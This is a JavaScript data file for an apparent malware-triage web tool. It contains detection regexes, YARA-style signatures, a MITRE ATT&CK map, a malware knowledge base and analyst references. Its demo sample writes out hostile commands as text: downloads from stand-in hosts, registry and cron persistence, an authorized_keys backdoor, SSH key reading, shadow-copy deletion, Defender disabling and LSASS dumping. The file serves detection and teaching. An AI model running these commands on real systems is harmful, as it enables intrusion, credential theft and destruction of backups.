/* =====================================================================
   ThreatRecon — rules.js
   Static detection content: behavioral rules, YARA-style signatures,
   MITRE ATT&CK lookup table, knowledge-base / tooling reference data, and
   the demonstration sample. This file contains DATA only — no execution,
   no network, no eval. All patterns are plain regular expressions matched
   against text in the browser.
   ===================================================================== */

/* Behavioral rules. Each: { rx, sev, label, tech }.
   sev ∈ CRITICAL | HIGH | MED | LOW. tech is one or more MITRE technique IDs. */
export const BEHAVIOR_RULES = [
  // --- Execution / obfuscation ---
  { rx: /(-enc|-encodedcommand|frombase64string)/i, sev: 'CRITICAL', label: 'Encoded PowerShell command — obfuscated payload delivery', tech: 'T1027.010' },
  { rx: /invoke-expression|iex\s*[\(\$]/i, sev: 'CRITICAL', label: 'IEX / Invoke-Expression — dynamic code execution', tech: 'T1059.001' },
  { rx: /(bypass|executionpolicy.*bypass|-nop\b|-noprofile)/i, sev: 'HIGH', label: 'PowerShell execution policy bypass', tech: 'T1059.001' },
  { rx: /([`^]\s*[a-z]|"\s*\+\s*"|''\s*\+\s*'')/i, sev: 'MED', label: 'String-splitting / tick obfuscation in PowerShell', tech: 'T1027' },
  // --- LOLBins ---
  { rx: /(certutil.*-decode|certutil.*-encode|certutil.*-urlcache)/i, sev: 'HIGH', label: 'certutil abuse — LOLBin payload decode/download', tech: 'T1140' },
  { rx: /\bmshta(\.exe)?\b/i, sev: 'HIGH', label: 'MSHTA execution — HTML application LOLBin abuse', tech: 'T1218.005' },
  { rx: /\bregsvr32(\.exe)?\b.*(\/i|\/s|scrobj|http)/i, sev: 'HIGH', label: 'regsvr32 abuse — scriptlet / squiblydoo execution', tech: 'T1218.010' },
  { rx: /\brundll32(\.exe)?\b/i, sev: 'HIGH', label: 'rundll32 abuse — DLL export / proxy execution', tech: 'T1218.011' },
  { rx: /(cmstp|wmic.*process.*call|InstallUtil\.exe|msiexec.*\/i.*http)/i, sev: 'HIGH', label: 'CMSTP / WMIC / InstallUtil / msiexec LOLBin abuse', tech: 'T1218' },
  { rx: /(csc\.exe|msbuild\.exe.*target)/i, sev: 'MED', label: 'MSBuild / csc LOLBin — on-host .NET compilation', tech: 'T1127.001' },
  // --- Download / staging ---
  { rx: /(net\.webclient|downloadstring|downloadfile|invoke-webrequest|iwr\s|bitstransfer|bitsadmin|start-bitstransfer)/i, sev: 'HIGH', label: 'Network download cradle — remote payload staging', tech: 'T1105' },
  { rx: /(curl\s+-[a-z]*o|wget\s+http|\bwget\b.*-O)/i, sev: 'HIGH', label: 'curl/wget remote download — payload staging', tech: 'T1105' },
  // --- Persistence (Windows) ---
  { rx: /(schtasks.*\/create|new-scheduledtask|register-scheduledtask|\bat\.exe\b)/i, sev: 'HIGH', label: 'Scheduled task creation — persistence mechanism', tech: 'T1053.005' },
  { rx: /(reg\s+add\s+HK(CU|LM)|New-ItemProperty.*Run|CurrentVersion\\Run)/i, sev: 'HIGH', label: 'Registry Run key modification — persistence', tech: 'T1547.001' },
  { rx: /(Winlogon\\\\?Shell|Userinit|AppInit_DLLs)/i, sev: 'HIGH', label: 'Winlogon / AppInit persistence hijack', tech: 'T1547' },
  { rx: /(New-Service|sc\s+create|sc\.exe\s+create)/i, sev: 'MED', label: 'Windows service creation — persistence', tech: 'T1543.003' },
  // --- Persistence (Linux) ---
  { rx: /(crontab\s+-|\/etc\/cron|\/var\/spool\/cron)/i, sev: 'HIGH', label: 'Cron job persistence (Linux)', tech: 'T1053.003' },
  { rx: /(\/etc\/rc\.local|\/etc\/init\.d\/|systemctl\s+enable|\.service\b)/i, sev: 'MED', label: 'init.d / systemd service persistence (Linux)', tech: 'T1543.002' },
  { rx: /(~\/\.bashrc|~\/\.bash_profile|\/etc\/profile\.d|\.bashrc\b)/i, sev: 'MED', label: 'Shell profile persistence (Linux)', tech: 'T1546.004' },
  { rx: /(~\/\.ssh\/authorized_keys|>>\s*authorized_keys)/i, sev: 'HIGH', label: 'SSH authorized_keys backdoor (Linux)', tech: 'T1098.004' },
  // --- Defense evasion ---
  { rx: /(Set-MpPreference|add-mppreference|disablerealtimemonitoring|disablebehaviormonitoring|ExclusionPath)/i, sev: 'CRITICAL', label: 'Windows Defender / AV exclusion or disable', tech: 'T1562.001' },
  { rx: /(taskkill.*\/f.*(av|defender)|tskill.*defender|sc.*stop.*windefend|net\s+stop.*defend)/i, sev: 'HIGH', label: 'AV / security process termination', tech: 'T1562.001' },
  { rx: /(netsh.*advfirewall|netsh.*firewall.*allow|New-NetFirewallRule|netsh.*firewall.*disable)/i, sev: 'MED', label: 'Firewall rule modification', tech: 'T1562.004' },
  { rx: /(Start-Process.*-WindowStyle\s+Hidden|cmd.*\/c.*\/q|-w\s+hidden|CreateNoWindow)/i, sev: 'HIGH', label: 'Hidden window / silent execution', tech: 'T1564.003' },
  { rx: /(Clear-EventLog|wevtutil\s+cl|auditpol\s+\/clear)/i, sev: 'MED', label: 'Event log clearing — anti-forensics', tech: 'T1070.001' },
  // --- Injection ---
  { rx: /(reflectivepe|reflective injection|VirtualAllocEx|WriteProcessMemory|CreateRemoteThread|NtMapViewOfSection|QueueUserAPC)/i, sev: 'CRITICAL', label: 'Reflective DLL / process injection indicators', tech: 'T1055' },
  // --- Credential access ---
  { rx: /(mimikatz|sekurlsa|lsadump|wce\.exe|fgdump|kerberoast)/i, sev: 'CRITICAL', label: 'Credential dumping tool signature (Mimikatz/WCE)', tech: 'T1003' },
  { rx: /(lsass\.exe|procdump.*lsass|MiniDumpWriteDump|comsvcs\.dll.*MiniDump)/i, sev: 'CRITICAL', label: 'LSASS memory access / credential harvest', tech: 'T1003.001' },
  { rx: /(Login Data|Local State|moz_logins|key4\.db|logins\.json|chrome.*password|vaultcli)/i, sev: 'HIGH', label: 'Browser credential / vault theft indicators', tech: 'T1555.003' },
  { rx: /(id_rsa|id_ed25519|~\/\.ssh\/|known_hosts|\.pem\b)/i, sev: 'HIGH', label: 'SSH private key / secret theft indicators', tech: 'T1552.004' },
  // --- Impact (ransomware) ---
  { rx: /(vssadmin.*delete|wbadmin.*delete|bcdedit.*recoveryenabled no|wmic.*shadowcopy.*delete|Get-WmiObject.*Win32_ShadowCopy)/i, sev: 'CRITICAL', label: 'Shadow copy / backup deletion — ransomware pre-encrypt phase', tech: 'T1490' },
  { rx: /(ransom|your files|decrypt|bitcoin.*pay|\.locked|\.enc\b|\.crypted|README.*DECRYPT|HOW_TO_DECRYPT)/i, sev: 'HIGH', label: 'Ransom note / encrypted extension pattern', tech: 'T1486' },
  // --- Resource hijacking ---
  { rx: /(stratum\+tcp|monero|xmrig|cryptonight|nicehash|minexmr|nanopool|pool\..*:\d{2,5})/i, sev: 'HIGH', label: 'Cryptominer pool / XMRig signature', tech: 'T1496' },
  // --- C2 / proxy ---
  { rx: /(\.onion|torrc|socks5.*127\.0\.0\.1:9050|tor2web)/i, sev: 'HIGH', label: 'Tor C2 / hidden service reference', tech: 'T1090.003' },
  { rx: /(beacon|cobaltstrike|\/c2\b|c2_server|teamserver|meterpreter)/i, sev: 'HIGH', label: 'C2 framework reference (Cobalt Strike / Meterpreter)', tech: 'T1071' },
  // --- Script-language abuse ---
  { rx: /(WScript\.Shell|Shell\.Application|ActiveXObject|CreateObject.*WScript)/i, sev: 'HIGH', label: 'WScript/Shell COM object abuse — script-based execution', tech: 'T1059.005' },
  { rx: /(eval\s*\(\s*(base64_decode|gzinflate|str_rot13|gzuncompress)|base64_decode\s*\(\s*\$_(POST|GET|REQUEST))/i, sev: 'CRITICAL', label: 'PHP eval/base64_decode webshell pattern', tech: 'T1505.003' },
  { rx: /(passthru|proc_open|shell_exec|system)\s*\(\s*\$_(POST|GET|REQUEST)/i, sev: 'CRITICAL', label: 'PHP command execution from request input — webshell', tech: 'T1505.003' },
  { rx: /(strrev|str_rot13|gzinflate|gzuncompress)\s*\(/i, sev: 'MED', label: 'PHP obfuscation function chain', tech: 'T1027' },
  { rx: /(eval|exec|compile)\s*\(|__import__\s*\(|os\.system\s*\(|subprocess\.(Popen|call|run)/i, sev: 'MED', label: 'Python dynamic exec / process spawning', tech: 'T1059.006' },
  { rx: /(eval\s*\(|new\s+Function\s*\(|atob\s*\(|unescape\s*\(|String\.fromCharCode\s*\(\s*\d)/i, sev: 'MED', label: 'JavaScript obfuscation / dynamic eval pattern', tech: 'T1059.007' },
  { rx: /[A-Za-z0-9+\/]{80,}={0,2}/, sev: 'MED', label: 'Large Base64 encoded blob — likely embedded payload', tech: 'T1027' },
  { rx: /(XorEncrypt|xor_decrypt|rc4\s*=|AES\.new|Fernet|CryptoStream)/i, sev: 'MED', label: 'Custom encryption / obfuscation implementation', tech: 'T1027' },
  // --- Discovery ---
  { rx: /(whoami|net\s+user|net\s+localgroup|systeminfo|ipconfig\s*\/all|net\s+view|nltest|net\s+group)/i, sev: 'MED', label: 'System / network reconnaissance commands', tech: 'T1082' },
  { rx: /(nmap|masscan|arp-scan|angry ip|netdiscover|Test-NetConnection)/i, sev: 'MED', label: 'Network scanning tool detected', tech: 'T1046' },
  // --- Misc ---
  { rx: /(chmod\s+\+x|chmod\s+777|chattr\s+\+i)/i, sev: 'MED', label: 'Suspicious file permission change', tech: 'T1222' },
  { rx: /(net\s+user.*\/add|New-LocalUser|useradd.*-p|adduser\s)/i, sev: 'HIGH', label: 'Backdoor account creation', tech: 'T1136' },
];

/* YARA-style signatures. Each: { name, rx, desc }. */
export const YARA_RULES = [
  { name: 'CobaltStrike_Stager', rx: /(4d5a9000|msf|beacon|ReflectiveDll|pipe.*MSSE|checksum8)/i, desc: 'Cobalt Strike style stager or beacon-like artifact detected' },
  { name: 'PowerShell_Empire_C2', rx: /(System\.Net\.WebClient|DownloadString|powershell.*base64|empire|invoke-empire)/i, desc: 'PowerShell Empire C2 framework indicators' },
  { name: 'Ransomware_FileEncrypt', rx: /(\.locked|\.enc\b|\.crypted|vssadmin.*delete|bitcoin|ransom note|decrypt.*files)/i, desc: 'Multi-stage ransomware encryptor pattern — shadow copy deletion + extension change' },
  { name: 'Mimikatz_Credential_Dump', rx: /(sekurlsa|lsadump|kerberos|golden ticket|mimikatz|wce|fgdump)/i, desc: 'Mimikatz credential dumping module signatures' },
  { name: 'Registry_Run_Persistence', rx: /(HKCU|HKLM).*\\(Software\\Microsoft\\Windows\\CurrentVersion\\Run|Winlogon)/i, desc: 'Registry-based persistence via Run key or Winlogon hijack' },
  { name: 'ScheduledTask_Persist', rx: /(schtasks.*\/create|Register-ScheduledTask|at\s+\d+:\d+)/i, desc: 'Scheduled task persistence — common ransomware and RAT staging technique' },
  { name: 'Maldoc_VBA_Macro', rx: /(Auto_Open|AutoExec|Shell\s*\(|CreateObject.*Shell|Wscript\.Shell|macros)/i, desc: 'Malicious Office macro execution pattern — common phishing delivery vector' },
  { name: 'PHP_Webshell', rx: /(eval\s*\(\s*\$_(POST|GET|REQUEST)|system\s*\(\s*\$_(POST|GET)|passthru|base64_decode.*eval)/i, desc: 'PHP webshell execution pattern — persistent server-side access' },
  { name: 'LOLBin_Abuse_Chain', rx: /(certutil|mshta|regsvr32|rundll32|cmstp|InstallUtil|msiexec|csc\.exe).*http/i, desc: 'Living-off-the-land binary chain — trusted binary abused for payload download/execute' },
  { name: 'Infostealer_Exfil', rx: /(Clipboard|GetAsyncKeyState|keylog|browserpass|credential|steal|exfil|c2.*post|Login Data)/i, desc: 'Infostealer data exfiltration pattern — Lumma/RedLine/Vidar family indicators' },
  { name: 'Tor_C2_Infrastructure', rx: /(\.onion|torrc|socks5.*9050|TorBrowser)/i, desc: 'Tor hidden service or anonymized C2 reference detected' },
  { name: 'LSASS_Memory_Access', rx: /(lsass\.exe|OpenProcess.*0x1F0FFF|MiniDumpWriteDump|ProcDump.*-ma|comsvcs\.dll)/i, desc: 'LSASS memory dump for credential extraction' },
  { name: 'Backdoor_Account_Create', rx: /(net\s+user.*\/add|New-LocalUser|useradd.*-p|adduser|authorized_keys)/i, desc: 'Backdoor account / SSH key creation — common post-exploitation persistence' },
  { name: 'Base64_Payload_Embedded', rx: /(?:[A-Za-z0-9+\/]{60,}={0,2}\s*){2,}/, desc: 'Multiple contiguous Base64 blobs — staged payload or encoded shellcode' },
  { name: 'Cryptominer_Dropper', rx: /(xmrig|stratum\+tcp|monero|nicehash|cryptonight|nanopool|minexmr)/i, desc: 'XMRig / cryptominer pool configuration or dropper string' },
  { name: 'AV_Defense_Tamper', rx: /(Set-MpPreference|DisableRealtimeMonitoring|DisableBehaviorMonitoring|ExclusionPath|taskkill.*defender)/i, desc: 'Windows Defender / AV behavioral monitoring disable — pre-attack defense evasion' },
  { name: 'Linux_Persistence', rx: /(crontab\s+-|\/etc\/cron|\/etc\/rc\.local|systemctl\s+enable|\.bashrc)/i, desc: 'Linux persistence via cron, init scripts, systemd, or shell profile' },
];

/* MITRE ATT&CK technique lookup for display labels. */
export const MITRE_MAP = {
  'T1027': 'T1027 — Obfuscated Files or Info',
  'T1027.010': 'T1027.010 — Command Obfuscation',
  'T1059': 'T1059 — Command & Scripting Interpreter',
  'T1059.001': 'T1059.001 — PowerShell',
  'T1059.005': 'T1059.005 — Visual Basic',
  'T1059.006': 'T1059.006 — Python',
  'T1059.007': 'T1059.007 — JavaScript',
  'T1070.001': 'T1070.001 — Clear Windows Event Logs',
  'T1071': 'T1071 — Application Layer Protocol',
  'T1082': 'T1082 — System Info Discovery',
  'T1046': 'T1046 — Network Service Scanning',
  'T1090.003': 'T1090.003 — Multi-hop Proxy (Tor)',
  'T1098.004': 'T1098.004 — SSH Authorized Keys',
  'T1003': 'T1003 — OS Credential Dumping',
  'T1003.001': 'T1003.001 — LSASS Memory',
  'T1105': 'T1105 — Ingress Tool Transfer',
  'T1127.001': 'T1127.001 — MSBuild',
  'T1136': 'T1136 — Create Account',
  'T1140': 'T1140 — Deobfuscate/Decode Files',
  'T1218': 'T1218 — System Binary Proxy Exec',
  'T1218.005': 'T1218.005 — Mshta',
  'T1218.010': 'T1218.010 — Regsvr32',
  'T1218.011': 'T1218.011 — Rundll32',
  'T1222': 'T1222 — File & Directory Permissions',
  'T1486': 'T1486 — Data Encrypted for Impact',
  'T1490': 'T1490 — Inhibit System Recovery',
  'T1496': 'T1496 — Resource Hijacking',
  'T1505.003': 'T1505.003 — Web Shell',
  'T1543.002': 'T1543.002 — Systemd Service',
  'T1543.003': 'T1543.003 — Windows Service',
  'T1546.004': 'T1546.004 — Unix Shell Config',
  'T1547': 'T1547 — Boot/Logon Autostart',
  'T1547.001': 'T1547.001 — Registry Run Keys',
  'T1552.004': 'T1552.004 — Private Keys',
  'T1553': 'T1553 — Subvert Trust Controls',
  'T1555.003': 'T1555.003 — Credentials from Browsers',
  'T1562.001': 'T1562.001 — Disable/Modify AV',
  'T1562.004': 'T1562.004 — Disable Firewall',
  'T1564.003': 'T1564.003 — Hidden Window',
  'T1053.003': 'T1053.003 — Cron',
  'T1053.005': 'T1053.005 — Scheduled Task',
  'T1055': 'T1055 — Process Injection',
};

/* ─── Demonstration sample ──────────────────────────────────────────────
   SAFE TEXT ONLY. This string is never executed — it is dropped into the
   analyzer input box for triage. It intentionally contains many malicious
   *patterns* (download cradle, persistence, credential dumping, shadow-copy
   deletion, Defender tampering, injection, Tor C2, cryptominer, an encoded
   PowerShell command, a Base64 blob, IPs/URLs/onion/BTC/CVE) so that every
   engine lights up and the score reaches CRITICAL. */
export const DEMO_SAMPLE = [
  '# ThreatRecon demo sample — static text only, nothing here executes.',
  '',
  '# Phishing delivery (DEMO lure metadata + example placeholder hashes)',
  'Sender: demo training mailbox  Subject: "DEMO Invoice #4471"',
  'Example IOC hashes (clearly-fake demo placeholders, NOT real malware, NOT calculated):',
  'MD5:    00112233445566778899aabbccddeeff',
  'SHA1:   00112233445566778899aabbccddeeff00112233',
  'SHA256: 00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff',
  '',
  '# Encoded PowerShell command (Base64 of UTF-16LE "whoami /all")',
  'powershell -nop -w hidden -ExecutionPolicy Bypass -enc dwBoAG8AYQBtAGkAIAAvAGEAbABsAA==',
  '',
  '# Download-and-stage cradle from C2',
  'Invoke-WebRequest -Uri "http://malicious.example.com/evil.exe" -OutFile "C:\\Windows\\Temp\\evil.exe"',
  'certutil -urlcache -split -f http://203.0.113.10/payload.bin "C:\\Windows\\Temp\\p.bin"',
  'regsvr32 /s /u /i:http://malicious.example.com/sct.sct scrobj.dll',
  '# C2 beacon endpoints (RFC 5737 documentation/test IPs — safe demo only)',
  'C2: 198.51.100.20:8443  fallback 192.0.2.50:443',
  'rundll32.exe C:\\Users\\Public\\runtime.dll,EntryPoint',
  '',
  '# Persistence (Windows)',
  'schtasks /create /tn "EvilTask" /tr "C:\\Windows\\Temp\\evil.exe" /sc onlogon /f',
  'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d "C:\\Windows\\Temp\\evil.exe" /f',
  'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\evil.exe" /f',
  'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /d "explorer.exe,C:\\Windows\\Temp\\evil.exe" /f',
  '',
  '# Persistence (Linux) + SSH key theft / backdoor',
  'echo "* * * * * root /tmp/miner" >> /etc/cron.d/evil',
  'cat /home/user/.ssh/id_rsa',
  'echo "ssh-rsa AAAAB3Nz...attacker" >> ~/.ssh/authorized_keys',
  '',
  '# Inhibit recovery (ransomware pre-encryption)',
  'vssadmin delete shadows /all /quiet',
  '',
  '# Defender tampering',
  'Set-MpPreference -DisableRealtimeMonitoring $true',
  'Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"',
  '',
  '# Credential access',
  'sekurlsa::logonpasswords',
  'lsadump::sam',
  'procdump.exe -ma lsass.exe lsass.dmp',
  '',
  '# Injection indicators',
  'VirtualAllocEx; WriteProcessMemory; CreateRemoteThread',
  '',
  '# Tor C2 + cryptominer',
  'socks5 127.0.0.1:9050  demo-hidden-service.onion',
  'xmrig -o stratum+tcp://miner.example.com:443 -u 4xMoneroWalletExample',
  '',
  '# Ransom note + payment + exploit reference',
  'README_DECRYPT.txt : your files are .locked — pay bitcoin to 1DemoDemoDemoDemoDemoDemoDemo99 (invalid demo wallet, NOT a real address)',
  'Targets CVE-2021-44228 (Log4Shell)',
  '',
  '# Discovery',
  'whoami /all & systeminfo & ipconfig /all & net user',
  '',
  '# Additional encoded artifacts (decoded for display only, never executed)',
  '# hex shellcode marker -> "hello-shell"',
  'shellcode = \\x68\\x65\\x6c\\x6c\\x6f\\x2d\\x73\\x68\\x65\\x6c\\x6c',
  '# url-encoded C2 path -> "/admin/panel?cmd=whoami"',
  'c2path = %2Fadmin%2Fpanel%3Fcmd%3Dwhoami',
  '',
  '# Large Base64 blob to mimic an embedded payload',
  '$payload = "QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD"',
  '',
  '# Execute staged payload hidden',
  'Start-Process "C:\\Windows\\Temp\\evil.exe" -WindowStyle Hidden',
].join('\n');

/* ─── Threat intelligence knowledge base (compiled from public reporting) ─ */
export const KB_DATA = [
  { name: 'RaaS Ransomware (generic model)', type: 'ransomware', active: true, desc: 'Ransomware-as-a-Service: operators lease encryptors to affiliates who carry out intrusions. Commonly combines data theft with file encryption. Cross-platform variants target Windows, Linux, and VMware ESXi. Educational category — not an attribution to any specific group.', chips: ['RaaS', 'Cross-platform', 'Affiliate model'] },
  { name: 'ESXi / Linux Ransomware (technique)', type: 'ransomware', active: true, desc: 'Encryptors built for hypervisors and Linux hosts. Typically stops virtual machines, then encrypts datastores for maximum impact. Often deletes snapshots and backups before encryption.', chips: ['ESXi', 'Linux', 'Backup deletion'] },
  { name: 'Double-Extortion Ransomware (technique)', type: 'ransomware', active: true, desc: 'Exfiltrates sensitive data before encryption and threatens public leak to pressure payment. Leak sites and countdown timers are common. Initial access is frequently via stolen VPN/RDP credentials.', chips: ['Data theft', 'Leak site', 'VPN/RDP access'] },
  { name: 'LummaC2 (Lumma Stealer)', type: 'infostealer', active: true, desc: 'Leading infostealer. Harvests browser passwords, crypto wallets, 2FA codes, session cookies. MaaS model sold on underground forums. Recovered quickly after coordinated takedown attempts.', chips: ['MaaS', 'Browser creds', 'Session hijack'] },
  { name: 'StealC', type: 'infostealer', active: true, desc: 'Lightweight C-based stealer family. Modular design — operators choose target categories. Sold on dark web forums as MaaS. Used as precursor for ransomware deployments.', chips: ['Modular', 'MaaS', 'Ransomware precursor'] },
  { name: 'Vidar Stealer', type: 'infostealer', active: true, desc: 'Established infostealer based on the Arkei codebase. Harvests credentials, browser history, crypto wallets, 2FA apps. Delivered via malspam and fake crack sites.', chips: ['Arkei fork', 'Crypto wallets', 'MaaS'] },
  { name: 'AsyncRAT', type: 'rat', active: true, desc: 'Open-source .NET RAT heavily weaponized in commodity campaigns. Keylogging, screen capture, file exfiltration, reverse shell, UAC bypass. Highly customizable.', chips: ['.NET', 'Open source', 'Keylog'] },
  { name: 'PlugX (Korplug)', type: 'rat', active: true, desc: 'Modular backdoor used in long-running espionage campaigns. DLL sideloading delivery. Long-term persistence favorite.', chips: ['Espionage', 'DLL sideload', 'Modular'] },
  { name: 'Agent Tesla', type: 'rat', active: true, desc: '.NET-based RAT and credential stealer. Harvests credentials from 50+ apps including browsers, FTP, VPN, email clients. SMTP/HTTP/FTP exfiltration via high-volume phishing.', chips: ['.NET', '50+ targets', 'Email delivery'] },
  { name: 'Raspberry Robin', type: 'loader', active: true, desc: 'Worm/loader spread via infected USB drives. Acts as initial access broker for multiple ransomware affiliates. Heavily obfuscated, leverages LOLBins.', chips: ['USB worm', 'LotL', 'IAB'] },
  { name: 'Bumblebee', type: 'loader', active: true, desc: 'Sophisticated loader in ransomware affiliate chains. Delivered via malspam with ISO/LNK files. Deploys Cobalt Strike, ransomware, and exfil tools.', chips: ['ISO/LNK', 'Cobalt Strike', 'Ransomware chain'] },
  { name: 'Mirai (variants)', type: 'botnet', active: true, desc: 'IoT botnet with a massive variant ecosystem. Targets SOHO routers, IP cameras, and exposed cloud/container APIs. Used for DDoS-for-hire, cryptomining, and proxy services.', chips: ['IoT', 'DDoS', 'Variant explosion'] },
  { name: 'WhisperGate', type: 'wiper', active: true, desc: 'Destructive wiper masquerading as ransomware — no decryption key ever provided. MBR overwrite renders systems unbootable.', chips: ['Destructive', 'MBR wipe', 'Fake ransomware'] },
  { name: 'PROMPTFLUX', type: 'ai-malware', active: true, desc: 'Experimental malware that queries LLMs mid-execution to adapt evasion logic. Polymorphic payloads generated on-the-fly. Signature detection largely ineffective.', chips: ['AI-powered', 'Polymorphic', 'Adaptive'] },
  { name: 'Formbook / XLoader', type: 'infostealer', active: true, desc: 'Long-running MaaS infostealer family. XLoader is the macOS/Linux evolution. Form grabbing, keylogging, screenshot capture. Low-cost on dark web.', chips: ['Form grabbing', 'macOS/Linux', 'Phishing'] },
];

/* ─── RE tooling reference ──────────────────────────────────────────────── */
export const TOOLS_DATA = [
  { name: 'Ghidra', cat: 'Disassembler / Decompiler', desc: 'NSA-developed free reverse engineering suite. Industry standard for static analysis of binaries. Java decompiler, multi-architecture support.', use: 'ghidra — launch GUI | analyzeHeadless for batch', free: true },
  { name: 'x64dbg / x32dbg', cat: 'Dynamic Debugger', desc: 'Open-source Windows debugger for 32/64-bit executables. Plugin ecosystem: ScyllaHide for anti-anti-debug, xAnalyzer for annotations.', use: 'x64dbg.exe — attach or open executable', free: true },
  { name: 'IDA Free', cat: 'Disassembler', desc: 'Free version of IDA Pro. x86/x64 support. Excellent for initial static analysis. Cloud decompiler access via Hex-Rays plugin.', use: 'ida64.exe or ida.exe for 32-bit targets', free: true },
  { name: 'YARA-X', cat: 'Pattern Matching Engine', desc: 'Rust rewrite of the YARA pattern matching engine. Faster, safer, backward-compatible. Used in threat hunting and malware classification.', use: 'yr scan rules.yar /path/to/samples', free: true },
  { name: 'Volatility 3', cat: 'Memory Forensics', desc: 'The standard for memory forensics. Extracts processes, network connections, registry hives, DLLs, and injected code from memory dumps.', use: 'vol -f memory.dmp windows.pslist', free: true },
  { name: 'REMnux', cat: 'Analysis Distro (Linux)', desc: 'Linux distro pre-loaded with 100+ RE tools — CyberChef, FLOSS, CAPA, Radare2, YARA, Wireshark, and more.', use: 'Download from remnux.org — VMware/VirtualBox OVA', free: true },
  { name: 'FLARE VM', cat: 'Analysis Distro (Windows)', desc: "Mandiant's Windows-based RE environment. Installs Ghidra, x64dbg, IDA Free, PEStudio, CAPA, ProcMon, FakeNet-NG and more.", use: 'Install via PowerShell from github.com/mandiant/flare-vm', free: true },
  { name: 'PEStudio', cat: 'PE Static Analysis', desc: 'Fast PE file inspection — imports, exports, strings, sections, entropy, VirusTotal integration. First-pass triage for Windows PE samples.', use: 'Open PE file — review imports/entropy tabs first', free: true },
  { name: 'CyberChef', cat: 'Data Transformation', desc: 'The "Cyber Swiss Army Knife" — 400+ operations for encoding, decoding, deobfuscation, hashing, parsing.', use: 'gchq.github.io/CyberChef or local download', free: true },
  { name: 'Wireshark', cat: 'Network Analysis', desc: 'Packet capture and analysis. Inspect C2 communication, DNS queries, and exfiltration. Pairs with FakeNet-NG for dynamic analysis.', use: 'wireshark — start capture before executing sample', free: true },
  { name: 'FakeNet-NG', cat: 'Network Simulation', desc: "FLARE's network simulation tool. Intercepts and logs all network traffic from a sample, revealing C2 domains without real network exposure.", use: 'fakenet.exe — run before sample execution', free: true },
  { name: 'CAPA', cat: 'Capability Detection', desc: "FLARE's tool that identifies executable capabilities using MITRE ATT&CK and MAEC frameworks.", use: 'capa.exe sample.exe | capa -v sample.exe', free: true },
  { name: 'FLOSS', cat: 'String Extraction', desc: 'FLARE Obfuscated String Solver — extracts obfuscated/stack/encoded strings static analysis misses.', use: 'floss.exe malware.exe — output to file', free: true },
  { name: 'de4dot', cat: '.NET Deobfuscator', desc: 'Open-source .NET deobfuscator. Cleans obfuscated .NET malware by renaming symbols and removing control-flow obfuscation.', use: 'de4dot.exe obfuscated.exe — outputs clean.exe', free: true },
  { name: 'Detect-It-Easy (DIE)', cat: 'File Identification', desc: 'Identifies file types, compilers, packers, and protectors. Tells you if a sample is packed with UPX, ASPack, .NET, Go, Rust, etc.', use: 'die.exe sample.exe — check packer/compiler result', free: true },
  { name: 'Radare2 / Cutter', cat: 'RE Framework', desc: 'Open-source RE framework with CLI (r2) and GUI (Cutter). Scriptable with r2pipe. Good for shellcode and quick static analysis.', use: 'r2 -A sample.bin | cutter — GUI launcher', free: true },
];

/* ─── Analyst cheat sheet ───────────────────────────────────────────────── */
export const CS_DATA = [
  { head: 'Static Analysis — First Pass', items: [
    { cmd: 'file sample.exe', note: 'Identify file type, architecture' },
    { cmd: 'die.exe sample.exe', note: 'Detect packer, compiler, protector' },
    { cmd: 'strings -n 6 sample.exe', note: 'Extract printable strings ≥6 chars' },
    { cmd: 'floss.exe sample.exe', note: 'Extract obfuscated stack strings' },
    { cmd: 'capa.exe sample.exe', note: 'ATT&CK capability identification' },
    { cmd: 'sha256sum sample.exe', note: 'Hash for VT / threat intel pivot' },
  ] },
  { head: 'Deobfuscation Techniques', items: [
    { cmd: 'CyberChef: From Base64', note: 'Decode base64 encoded payloads' },
    { cmd: 'CyberChef: XOR Brute Force', note: 'Crack single-byte XOR keys' },
    { cmd: 'CyberChef: ROT13 / ROT47', note: 'Classic string obfuscation' },
    { cmd: '[Convert]::FromBase64String', note: 'Decode PS -EncodedCommand (UTF-16LE)' },
    { cmd: 'de4dot.exe obf.exe', note: 'Clean .NET obfuscated assemblies' },
    { cmd: 'js-beautify / JStillery', note: 'Deobfuscate JavaScript malware' },
  ] },
  { head: 'Volatility 3 Memory Forensics', items: [
    { cmd: 'windows.pslist', note: 'List running processes' },
    { cmd: 'windows.pstree', note: 'Process tree — spot injected processes' },
    { cmd: 'windows.netscan', note: 'Network connections at capture time' },
    { cmd: 'windows.malfind', note: 'Find injected code/hollowing' },
    { cmd: 'windows.cmdline', note: 'Command-line args for all processes' },
  ] },
  { head: 'IOC Pivoting — Free Resources', items: [
    { cmd: 'virustotal.com/gui/search/[hash]', note: 'Multi-AV scan + relations graph' },
    { cmd: 'shodan.io/host/[ip]', note: 'Open ports, banners, geoloc' },
    { cmd: 'urlscan.io/search/#[domain]', note: 'DNS history, screenshots, JS' },
    { cmd: 'bazaar.abuse.ch', note: 'Hash lookup + sample download' },
    { cmd: 'otx.alienvault.com', note: 'Community IOC pulses' },
  ] },
  { head: 'YARA Rule Writing', items: [
    { cmd: 'strings: $s1 = "string"', note: 'Define string pattern' },
    { cmd: 'strings: $b = { 4D 5A 90 }', note: 'Hex byte pattern (MZ header)' },
    { cmd: 'strings: $r = /regex/', note: 'Regular expression pattern' },
    { cmd: 'condition: all of them', note: 'All strings must match' },
    { cmd: 'condition: uint16(0)==0x5A4D', note: 'Check MZ PE header' },
  ] },
  { head: 'Anti-Analysis Bypass', items: [
    { cmd: 'ScyllaHide (x64dbg plugin)', note: 'Bypass IsDebuggerPresent etc.' },
    { cmd: 'Patch JMP to JNE/JE', note: 'Invert sandbox-detect branch' },
    { cmd: 'Fakenet-NG', note: 'Simulate network — defeat connectivity checks' },
    { cmd: 'Speed up sandbox clock', note: 'Fool sleep-based evasion' },
    { cmd: 'x64dbg: patch anti-debug API', note: 'NOP / return 0 for debug checks' },
  ] },
];

